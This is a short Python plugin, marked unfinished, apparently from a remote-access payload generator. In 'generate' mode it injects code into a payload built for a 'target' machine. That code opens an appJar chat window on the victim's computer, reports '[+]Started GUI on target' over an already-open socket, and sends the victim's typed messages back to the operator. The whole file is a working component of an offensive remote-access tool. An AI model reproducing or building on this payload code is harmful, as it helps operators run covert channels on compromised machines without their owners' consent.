#By ev-ev and not fully done
import library.modules.config as config

config.main()


def main(option):
    if option == "generate":
        config.import_statements.append('import appJar')
        config.import_statements.append('import time')
        config.functions.append('''
def userInterGUI():
    global s,app,old_message
    app=appJar.gui('msg')
    app.startPanedFrame("p1")
    app.addLabel("l1", "Your messages")
    app.addScrolledTextArea('msgs')
    app.startPanedFrame("p2")
    app.addLabel("l2", "His messages")
    app.addEmptyMessage('haxmsg')
    app.stopPanedFrame()
    app.stopPanedFrame()
    s.sendall('[+]Started GUI on target'.encode())
    old_message=''
    app.registerEvent(updater)
    app.setPollTime('100')
    app.go()
def updater():
    global s,old_message,app
    try:
        this_message=app.getTextArea('msgs')
        if old_message!=this_message:
            old_message=this_message
            s.sendall(this_message.encode())
    except:
        app.quit()
''')
